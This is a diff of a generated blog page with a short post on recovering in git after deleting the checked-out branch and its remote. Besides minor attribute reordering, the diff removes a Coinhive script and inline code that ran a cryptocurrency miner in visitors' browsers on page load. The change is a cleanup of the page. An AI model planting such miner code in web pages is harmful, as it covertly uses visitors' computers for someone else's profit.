@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -119,7 +96,7 @@
 <p>Have you ever deleted the <code>remote</code> of the branch you've got checked out? And then deleted the corresponding
 local branch (that you've still got checked out)?</p>
 <p>If you've answered with Yes to at least one of the one question above, then I encourage you to read further. Alternatively, you may still proceed at your own caution - might save you some troubles down the line :)</p>
-<p>Now <code>git</code> believes that <code>HEAD</code> doesn't exist and your current branch has no commits, but stages all files that were associated with the branch as new files. Wunderbah<sup id="fnref:wunderbah"><a rel="footnote" class="footnote-ref" href="#fn:wunderbah">1</a></sup>! Just wunderbah! How do you get out of that Houdini?!? Can you reset to <code>HEAD</code> or <code>HEAD^</code>. Nein! Further - as if it's not a big enough fun already - depending on how different your branch was to any other, it may not let you checkout anything else.</p>
+<p>Now <code>git</code> believes that <code>HEAD</code> doesn't exist and your current branch has no commits, but stages all files that were associated with the branch as new files. Wunderbah<sup id="fnref:wunderbah"><a class="footnote-ref" rel="footnote" href="#fn:wunderbah">1</a></sup>! Just wunderbah! How do you get out of that Houdini?!? Can you reset to <code>HEAD</code> or <code>HEAD^</code>. Nein! Further - as if it's not a big enough fun already - depending on how different your branch was to any other, it may not let you checkout anything else.</p>
 <p>Okay, time for solutions! You could opt for performing <code>git rm -f</code> on everything that had been staged. At that point, an actual branch can be checked out again. Alternatively, invoking <code>git reflog</code> followed by <code>git checkout</code> of the commit hash of the head of the old branch should do the job.
 If you want to play fancy, you can re-create the branch, make a commit, checkout another branch, and delete the originally intended branch.</p>
 <p>That's about it! Have lots of fun in <code>git</code>land and see you soon!</p>
@@ -127,7 +104,7 @@ If you want to play fancy, you can re-create the branch, make a commit, checkout
 <hr />
 <ol>
 <li id="fn:wunderbah">
-<p>For the non-German speaking among you, <em>wunderbah</em> means <em>wonderful</em>. <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:wunderbah">↩</a></p>
+<p>For the non-German speaking among you, <em>wunderbah</em> means <em>wonderful</em>. <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:wunderbah" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -178,7 +155,7 @@ If you want to play fancy, you can re-create the branch, make a commit, checkout
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
